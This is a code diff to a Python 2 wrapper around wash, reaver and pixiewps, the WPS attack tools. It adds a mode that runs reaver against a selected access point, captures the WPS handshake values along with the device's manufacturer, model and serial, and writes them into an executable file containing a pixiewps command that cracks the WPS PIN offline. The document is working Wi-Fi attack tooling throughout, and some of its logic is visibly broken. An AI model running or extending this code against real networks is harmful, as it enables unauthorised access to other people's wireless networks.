@@ -44,6 +44,12 @@ import os
 import signal
 import re
 import sys
+import stat
+
+PLOOP=""
+ENABLED="ENABLED"
+DISABLED="DISABLED"
+ACTIVESTATUS=""
 hasLog=""
 channel=""
 bssid=""
@@ -53,6 +59,7 @@ clr="clear"
 def menu():
 	global clr
 	global interface
+	global PLOOP
 	while True:
 		menuSelect=""
 		os.system(clr)
@@ -74,13 +81,21 @@ def menu():
 
 
 		if hasLog == "Yes": print "           settings loaded."
+		if PLOOP!="1":
+			PLOOP=""
+			ACTIVESTATUS=DISABLED
+		elif PLOOP=="1":
+			PLOOP="1"
+			ACTIVESTATUS=ENABLED
+			
 		print
 		print "Menu:"
 		print "1: Manual input"
 		print "2: Wash scan"
 		print "3: start mon0 (setup in settings)"
 		print "4: settings"
-		print "5: Exit"
+		print "5: PixieHash Gathering Mode [\033[1;31m %s \033[0m\033[1;32m]" % (ACTIVESTATUS)
+		print "6: Exit"
 		print
 		menuSelect = raw_input("Option:")
 
@@ -91,7 +106,14 @@ def menu():
 			Wash()
 		elif menuSelect=="3":Startmon()
 		elif menuSelect=="4":Settings()
-		elif menuSelect=="5":exit()
+		elif menuSelect=="5":
+			if PLOOP!="1":
+				PLOOP="1"
+				ACTIVESTATUS=ENABLED
+			elif PLOOP=="1":
+				PLOOP=""
+				ACTIVESTATUS=DISABLED
+		elif menuSelect=="6":exit()
 		elif menuSelect.lower()=="debug":clr=""
 		elif menuSelect.lower()=="exit":exit()
 		elif menuSelect.lower()=="i know your secrets":print "well you better keep your mouth shut!"
@@ -122,7 +144,7 @@ def Wash():
 	else:excludedBssid=""
 	fWashOut = open("fWashOut", "w")
 	fWashError = open("fWashError", "w")
-	pidW = Popen(["wash", "-i", interface, "-C"], stdout=fWashOut, stderr=fWashError).pid
+	pidW = Popen(["wash", "-i", interface, "-C", "-s"], stdout=fWashOut, stderr=fWashError).pid
 	f = open('fWashOut')
 	load="-"
 	try:
@@ -148,13 +170,20 @@ def Wash():
 						pwr.append (line[37:41])
 						lock.append (line[64:69])
 			os.system(clr)
-			if len(bssid)==int(1):print "Scan started, No accesspoints with WPS detected yet.", load
+			if len(bssid)==int(1):
+				print "Scan started, No accesspoints with WPS detected yet.", load
+
 			for x in range(0,len(bssid)-1):
-				if x == 0:print "Press CTRL+C to stop scan and choose accesspoint"
-				if x > 8:spacer="-"
-				if any(bssid[x] in s for s in excludedBssid):continue
-				if "Y" in lock[x]: print "\033[1;31m", x+1,spacer, "-b:",bssid[x], " -c:", channel[x], "Pwr", pwr[x], "-e:", essid[x], "\033[0m\033[1;32m"
-				if "N" in lock[x]: print "\033[0m\033[1;32m", x+1,spacer, "-b:",bssid[x], " -c:", channel[x], "Pwr", pwr[x], "-e:", essid[x]
+				if x == 0:
+					print "Press CTRL+C to stop scan and choose accesspoint"
+				if x > 8:
+					spacer="-"
+				if any(bssid[x] in s for s in excludedBssid):
+					continue
+				if "Y" in lock[x]: 
+					print "\033[1;31m", x+1,spacer, "-b:",bssid[x], " -c:", channel[x], "Pwr", pwr[x], "-e:", essid[x], "\033[0m\033[1;32m"
+				if "N" in lock[x]: 
+					print "\033[0m\033[1;32m", x+1,spacer, "-b:",bssid[x], " -c:", channel[x], "Pwr", pwr[x], "-e:", essid[x]
 			time.sleep(0.5)
 			if load=="|":load="/"
 			elif load=="/":load="-"
@@ -249,27 +278,42 @@ def LoadSettings():
 	if usel=="No":lofFile=""
 
 def reaver():
+	global PLOOP
+	global MAN
+	global MODEL
+	global SERIAL
 	global PKE
-	global PKEb
 	global AuthKey
-	global AuthKeyb
 	global EHash1
-	global EHash1b
 	global EHash2
-	global EHash2b
 	global doing
 	global Cline
 	global bssid
 	global WPAkey
 	global WPSpin
 	global PKR
-	global PKRb
 	global Enonce
+	global HEADER_MADE
+
+	global EHash2b
 	global Enonceb
+	global PKRb
+	global EHash1b
+	global AuthKeyb
+	global PKEb
+
+	global EHash2c
+	global Enoncec
+	global PKRc
+	global EHash1c
+	global AuthKeyc
+	global PKEc
+
+	MAN=""
+	MODEL=""
+	SERIAL=""
 	PKR=""
-	PKRb=""
 	Enonce=""
-	Enonceb=""
 	WPAkey=""
 	WPApin=""
 	Cline=[]
@@ -278,43 +322,135 @@ def reaver():
 	EHash1=""
 	EHash2=""
 	AuthKey=""
+	HEADER_MADE=""
+
+	PKRb=""
 	PKEb=""
 	EHash1b=""
 	EHash2b=""
+	Enonceb=""
 	AuthKeyb=""
+
+	PKRc=""
+	PKEc=""
+	EHash1c=""
+	EHash2c=""
+	Enoncec=""
+	AuthKeyc=""
+
 	hashing=""
 	doing="Retrieving hashes!"
 	delsession="%s%s%s" % ("/usr/local/etc/reaver/", re.sub('[^A-Za-z0-9.]+', '', bssid), ".wpc")
 	if os.path.isfile(delsession):os.remove(delsession)
 	fout = open("fReaverOut", "w")
 	ferr = open("fReaverErrors", "w")
-	pid = Popen(["reaver", "-i", interface, "-c", channel, "-b", bssid, "-vv"], stdout=fout, stderr=ferr).pid
+
+	if PLOOP=="1":
+		pid = Popen(["reaver", "-i", interface, "-c", channel, "-b", bssid, "-vv", "-P", "-a", "-N", "-d 0"], stdout=fout, stderr=ferr).pid
+	if PLOOP!="1":
+		pid = Popen(["reaver", "-i", interface, "-c", channel, "-b", bssid, "-vv", "-a", "-N"], stdout=fout, stderr=ferr).pid
 	f = open("fReaverOut")
 	try:
 		while True:
 			line = f.readline()
 			while line:
+
+				if "Manufacturer:" in line:
+					MAN=line[line.find("Manufacturer:")+14:line.find("\n")]
+				if "Model Number:" in line:
+					MODEL=line[line.find("Model Number:")+14:line.find("\n")]
+				if "Serial Number:" in line:
+					SERIAL=line[line.find("Serial Number:")+15:line.find("\n")]
+
+
 				if "PKE:" in line:
 					PKE=line[line.find("PKE:")+5:line.find("\n")]
 					PKEb=len(re.sub('[^A-Fa-f0-9]+', '', PKE))/2,
-				if "AuthKey:" in line:
-					AuthKey=line[line.find("AuthKey:")+9:line.find("\n")]
-					AuthKeyb=len(re.sub('[^A-Fa-f0-9]+', '', AuthKey))/2,
-				if "E-Hash1" in line:
-					EHash1=line[line.find("E-Hash1:")+9:line.find("\n")]
-					EHash1b=len(re.sub('[^A-Fa-f0-9]+', '', EHash1))/2,
-				if "E-Hash2" in line:
-					EHash2=line[line.find("E-Hash2:")+9:line.find("\n")]
-					EHash2b=len(re.sub('[^A-Fa-f0-9]+', '', EHash2))/2,
+									
+
 				if "PKR:" in line:
 					PKR=line[line.find("PKR:")+5:line.find("\n")]
 					PKRb=len(re.sub('[^A-Fa-f0-9]+', '', PKR))/2,
+				
+				if "AuthKey:" in line:
+					AuthKey=line[line.find("AuthKey:")+9:line.find("\n")]
+					AuthKeyb=len(re.sub('[^A-Fa-f0-9]+', '', AuthKey))/2,
+					
+				if "E-Hash1" in line:
+					EHash1=line[line.find("E-Hash1:")+9:line.find("\n")]
+					EHash1b=len(re.sub('[^A-Fa-f0-9]+', '', EHash1))/2,
+					
+				if "E-Hash2" in line:
+					EHash2=line[line.find("E-Hash2:")+9:line.find("\n")]
+					EHash2b=len(re.sub('[^A-Fa-f0-9]+', '', EHash2))/2,
+						
 				if "E-Nonce:" in line:
 					Enonce=line[line.find("E-Nonce:")+9:line.find("\n")]
 					Enonceb=len(re.sub('[^A-Fa-f0-9]+', '', Enonce))/2,
-				if PKE!="" and PKR!="" and AuthKey!="" and EHash1!="" and EHash2!="":hashing="done"
+
+				if PLOOP!="1" and PKE!="" and PKR!="" and AuthKey!="" and EHash1!="" and EHash2!="":hashing="done"
+				#if PKE!=PKEc or PKR!=PKRc or AuthKey!=AuthKeyc or EHash1!=EHash1c or EHash2!=EHash2c:
+				if PKE!=PKEc and PKR!=PKRc and AuthKey!=AuthKeyc and EHash1!=EHash1c and EHash2!=EHash2c and Enonce!=Enoncec:
+				    if PKE!="" and PKR!="" and AuthKey!="" and EHash1!="" and EHash2!="":
+					pixieHashFileName="PixieHash_%s--%s" % (essid,bssid)
+					with open(pixieHashFileName,"a+") as pixieHashes:
+						
+						if HEADER_MADE!="1":
+							pline = pixieHashes.readline()
+							while pline:
+								if "-----END AP INFO-----" in line:
+									HEADER_MADE="1"
+									
+
+
+							pline = pixieHashes.readline()
+							sheBang="#!/usr/bin/env bash"
+
+							startGenHead="\n#\t-----AP INFO-----\t#\n#"
+							endGenHead="#\n#\t-----END AP INFO-----\t#\n#\n#\n#"
+
+							conninfo="#\n#essid:%s\n#bssid:%s\n#" % (essid, bssid)
+							apinfo="#Manufacturer:%s\n#Model Number:%s\n#Serial Number:%s\n#" % (MAN, MODEL, SERIAL)
+
+							HEADER_MADE="1"
+    							pixieHashes.write(sheBang + startGenHead + conninfo + apinfo + endGenHead)
+						
+						
+						if HEADER_MADE == "1":
+							hashStartHead="#\n#\t-----START PIXIE-HASHES-----\t#\n#\n#"
+							hashEndHead="#\n#\t-----END PIXIE-HASHES-----\t#\n#\n#"
+							
+							hashPad="#[P] "
+							pkeHash="%sPKE:\t%s\n" % (hashPad, PKE)
+							pkrHash="%sPKR:\t%s\n" % (hashPad, PKR)
+							authHash="%sAuthKey:\t%s\n" % (hashPad, AuthKey)
+							enonHash="%sEnonce:\t%s\n" % (hashPad, Enonce)
+							e1Hash="%sEHash1:\t%s\n" % (hashPad, EHash1)
+							e2Hash="%sEHash2:\t%s\n" % (hashPad, EHash2)
+							pixiewpsRun="\n\n\npixiewps -e %s -r %s, -s %s -z %s -a %s -n %s\n" % (PKE, PKR, EHash1, EHash2, AuthKey, Enonce)
+							
+    							pixieHashes.write(hashStartHead + pkeHash + pkrHash + authHash + enonHash + e1Hash + e2Hash + pixiewpsRun + hashEndHead)
+							PKEc=PKE
+							AuthKeyc=AuthKey
+							EHash1c=EHash1
+							EHash2c=EHash2
+							PKRc=PKR
+							Enoncec=Enonce
+
+							##### Lets clear the old values, and make sure we can get the new 
+							PKE=""
+							AuthKey=""
+							EHash1=""
+							EHash2=""
+							PKR=""
+							Enonce=""
+							
+					if HEADER_MADE =="1":
+						st = os.stat(pixieHashFileName)
+						os.chmod(pixieHashFileName, st.st_mode | 0111)
 				Cline.append (line)
 				line = f.readline()
+
 			if not line:status()
 			if hashing=="done":
 				os.kill(pid, signal.SIGQUIT)
@@ -329,6 +465,17 @@ def reaver():
 		if os.path.isfile("fReaverOut") == True:os.remove("fReaverOut")
 		if os.path.isfile("fReaverErrors") == True:os.remove("fReaverErrors")
 		menu()
+
+
+
+
+
+def hexHash(hex1,hex2,hex3,hex4,hex5,hex6):
+	return hash(int(hex1, 16) + int(hex2, 16) + int(hex3, 16) + int(hex4, 16) + int(hex5, 16) + int(hex6, 16))
+
+
+
+
 
 def convPin():
 	delsession="%s%s%s" % ("/usr/local/etc/reaver/", re.sub('[^A-Za-z0-9.]+', '', bssid), ".wpc")
@@ -384,6 +531,9 @@ def status():
 	print "bssid:%s" % (bssid)
 	print "essid:%s" % (essid)
 	print
+	print "Manufacturer:%s" % (MAN)
+	print "Model Number:%s" % (MODEL)
+	print "Serial Number:%s" % (SERIAL)
 	print "PKE:%s" % (PKEb)
 	print "PKR:%s" % (PKRb)
 	print "Authkey:%s" % (AuthKeyb)
